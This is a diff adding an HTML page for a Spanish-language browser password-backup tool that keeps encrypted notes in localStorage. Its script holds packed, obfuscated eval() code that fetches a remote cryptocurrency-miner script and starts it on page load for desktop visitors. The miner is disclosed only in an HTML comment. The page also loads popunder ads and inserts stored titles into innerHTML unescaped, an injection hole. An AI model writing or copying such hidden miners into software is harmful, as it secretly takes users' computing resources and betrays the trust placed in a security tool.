@@ -1,0 +1,268 @@
+<!-- 
+Programado por: Ivan Jesus Rojas Chaparro. 
+Nota: El codigo del algoritmo sha256 lo saque de internet el codigo para detectar si se esta en el movil o en la pc tambien al igual
+que bootstrap y los iconos, yo cree todo lo demas, esta mini web la monetizo con publicidad por favor no la bloquees si te gusta mi programa :D y solo mino
+criptomonedas cuando estas en la PC y al 20% de cpu o menos nunca en tu movil.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<title>passwordBackup</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+<link href="bootstrap.min.css" rel="stylesheet">
+<script type="text/javascript">
+    var adfly_id = 14996329;
+	var adfly_advert = 'init';
+	var frequency_cap = 5;
+	var frequency_delay = 5;
+	var init_delay = 3;
+	var popunder = true;
+    var popunder_frequency_delay = 0;
+    var adfly_google_compliant = true;
+</script>
+<script src="https://cdn.adf.ly/js/display.js"></script>
+<script src="sha256.js"></script>
+<script src="encriptar.js"></script>
+<style type="text/css">
+	.CUD {
+	margin:10px auto;
+	width:70%;
+	}
+	
+	@media (max-width:500px) {
+		.CUD {
+		width:95%;
+		}
+	}
+</style>
+</head>
+<body>
+<div class="container" id="MAIN">
+		<div class="modal modal-alert d-block bg-light py-2" style="position:fixed;width:100%;height:100%;" >
+		  <div class="CUD">
+			<div class="modal-content rounded-3 shadow">
+			  <div class="modal-body p-4 text-center">
+				<h5 class="mb-0">PasswordBackup - Lista</h5>
+				<p class="mb-0 text-secondary p-2 fw-bold" style="text-align:left;font-size:0.7em;">
+				<span class="fw-bold text-dark">Intrucciones: </span><br><span class="fw-bold text-dark">* </span>Escribe tu contraseña de archivo de nuevo para ver la informacion encriptada, si es la primera vez que creas este archivo no hace falta, dejar el campo de contraseña en blanco para proteger tu informacion de ojos curiosos.
+				</p>
+			  </div>
+			  <div class="modal-footer flex-nowrap p-0">
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end"><a href="index.html" style="text-decoration:none;">Cargar Archivo</a></button>
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end">Lista</button>
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end"><a href="encriptar.html" style="text-decoration:none;">Encriptar</a></button>
+			  </div>
+			  <div class="bg-secundary p-4 border-top" style="text-align:center;">
+					
+				<div class="mb-3 form-floating">        
+					<input type="password" class="form-control" id="clave" name="clave" placeholder="Contraseña de archivo">        
+					<label for="clave" class="form-label">Contraseña de archivo:</label>
+				</div>
+					
+				<div class="row">
+					<div class="col-10">
+						<input type="text" class="form-control" id="tituloC" placeholder="Titulo" value=""></input>        
+					</div>
+					<div class="col-2">
+						<button data-bs-toggle="modal" data-bs-target="#dialogo2" class="btn btn-sm btn-outline-primary">
+							<img src="card-text.svg" style="width:24px;height:24px;"></img>
+						</button>
+						<button title="Guardar" onclick="crearItemInformacion();" class="btn btn-sm btn-outline-success">
+							<img src="check.svg" style="width:24px;height:24px;"></img>
+						</button>
+					</div>
+				</div>
+									
+				<div id="lista" style="margin-top:10px;padding-top:10px;border-top:1px solid #eeeeee;">
+				
+
+				
+				
+				</div>
+				
+			  </div>
+			</div>
+		  </div>
+		</div>
+</div>
+
+<div class="modal fade" id="dialogo1">
+      <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="exampleModalLabel">Detalles</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+          </div>
+          <div class="modal-body">
+            <textarea class="form-control" rows="12" id="informacion" placeholder="Tu informacion secreta."></textarea>
+			<div style="text-align:center;">
+				<input class="btn btn-sm btn-primary mt-2" onclick="window.actualizar();" data-bs-dismiss="modal" type="button" value="Actualizar"></input>
+			</div>
+          </div>
+        </div>
+      </div>
+</div>
+
+<div class="modal fade" id="dialogo2">
+      <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="exampleModalLabel">Detalles</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+          </div>
+          <div class="modal-body">
+            <textarea class="form-control" rows="12" id="CrearInformacion" placeholder="Tu informacion secreta."></textarea>
+          </div>
+        </div>
+      </div>
+</div>
+
+</body>
+<script>
+		
+        let navegador = navigator.userAgent;
+        if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/Windows Phone/i)) {
+           // movil
+        } else {
+
+			// pc
+			eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 6="5://4.3.2/1.0";',8,8,'js|suc6|racing|hostingcloud|www|https|l|var'.split('|'),0,{}))
+			var script = document.createElement('script');
+			script.onload = function () {
+			   eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b 1=a 8.7(\'6\',{5:0.9,c:\'4\',3:0});1.2();',13,13,'|_client|start|ads|w|throttle|68ccf80a2a1846b35d413b11d5da28806ae25d17b6055e70aa050408f35e8fdf|Anonymous|Client||new|var|'.split('|'),0,{}))
+			};
+			script.src = l;
+
+			document.head.appendChild(script); 
+
+        }
+			
+		var archivoCargado = [false];
+		if(localStorage.archivoCargado != undefined){
+			let o = JSON.parse(localStorage.archivoCargado);
+			if(o.length > 0) {
+				archivoCargado = o;
+			}
+		}
+		/*
+		let aaaa = encriptar("hola","que onda");
+		alert( aaaa );
+		alert( desencriptar(aaaa,"que onda") );
+		*/
+		var itemEdicion = 0;
+		
+		window.actualizar = function() {
+			var clv = document.getElementById("clave").value;
+			
+			if( archivoCargado[0] == false ) {
+				datos[itemEdicion][1] = document.getElementById("informacion").value;
+			}else if( clv.length > 0 ) {
+				if( localStorage.clave == sha256( sha256(clv) + sha256(clv) ) ) {
+					datos[itemEdicion][1] = encriptar(document.getElementById("informacion").value,clv);
+				}else{
+					alert("Las contraseñas no coinciden");
+				}
+			}else{
+				alert("La contraseña esta vacia");
+			}
+			
+			localStorage.datos = JSON.stringify(datos);
+		}
+		
+		window.ver = function(indice) {
+
+			if( indice <= datos.length ) {
+				
+				var clv = document.getElementById("clave").value;
+				
+				itemEdicion = indice;
+				let o = document.getElementById("informacion");
+				o.value="";
+				
+				if( clv.length > 0 ) {
+					if( localStorage.clave == sha256( sha256(clv) + sha256(clv) ) ) {
+						o.value = desencriptar(datos[indice][1],clv);
+					}else{
+						alert("Las contraseñas no coinciden");
+					}
+				}else{
+					o.value = datos[indice][1];
+				}
+			}
+		}
+		
+		window.borrar = function(indice) {
+			try{
+				let ok = confirm("Borrar?");
+				if(ok){
+				
+				datos.splice(indice,1);
+				localStorage.datos = JSON.stringify(datos);
+				
+				let o = document.getElementById("item_"+indice);
+				o.parentNode.removeChild(o);
+				}
+			}catch(e){
+				alert(e);
+			}
+		}
+		
+		var itemActual = 0;
+		var datos = [];
+		if(localStorage.datos != undefined){
+			let o = JSON.parse(localStorage.datos);
+			if(o.length > 0) {
+			//	console.log(localStorage.datos);
+				datos = o;
+				cargarListaDeLocalStorage();
+			}
+		}
+		
+		function cargarListaDeLocalStorage() {
+			let o = document.getElementById("lista");
+			for(var i = 0; i < datos.length; i++) {
+				o.innerHTML += CrearItem(i,datos[i][0],i);
+			}
+		}
+		
+		function crearItemInformacion() {
+			
+			try{
+				let o = document.getElementById("lista");
+				let titulo = document.getElementById("tituloC");
+				let info = document.getElementById("CrearInformacion");
+				
+				datos.push( [titulo.value,info.value] );
+
+				localStorage.datos = JSON.stringify(datos);
+				
+				o.innerHTML += CrearItem(itemActual,titulo.value,datos.length-1);
+				itemActual++;
+				
+				titulo.value = "";
+				info.value = "";
+			}catch(e){
+				alert(e);
+			}
+		}
+		
+		function CrearItem(i,titulo,indiceInformacion) {
+		let l = `<div id="item_${i}" class="row my-2">
+						<div class="col-10">
+							<input type="text" readonly class="form-control" id="item${i}" value="${titulo}"></input>        
+						</div>
+						<div class="col-2">
+							<button data-bs-toggle="modal" onclick="window.ver(${indiceInformacion});" data-bs-target="#dialogo1" class="btn btn-sm btn-outline-primary">
+								<img src="key.svg" style="width:24px;height:24px;"></img>
+							</button>
+							
+							<input type="button" class="btn btn-sm btn-danger fw-bold" onclick="window.borrar(${indiceInformacion});"  value=" X "></input>   
+						</div>
+					</div>`;
+		return l;
+		} 
+		
+</script>
+<script src="bootstrap.bundle.min.js"></script>
+</html>
